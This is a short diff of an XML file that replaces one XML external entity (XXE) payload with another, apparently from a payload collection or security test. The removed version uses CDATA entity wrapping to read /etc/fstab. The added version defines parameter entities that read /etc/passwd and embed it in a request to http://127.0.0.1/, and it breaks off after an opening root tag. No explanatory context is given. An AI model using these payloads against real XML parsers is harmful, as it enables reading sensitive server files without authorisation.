@@ -1,8 +1,7 @@
-<!DOCTYPE data [
-  <!ENTITY start "<![CDATA[">
-  <!ENTITY file SYSTEM 
-"file:///etc/fstab">
-  <!ENTITY end "]]>">
-  <!ENTITY all "&start;&file;&end;">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % param1 "file:///etc/passwd">
+<!ENTITY % param2 "<!ENTITY % param222 SYSTEM'http://127.0.0.1/?%param1;'>">
+%param2;
 ]>
-<data>&all;</data>
+<root>
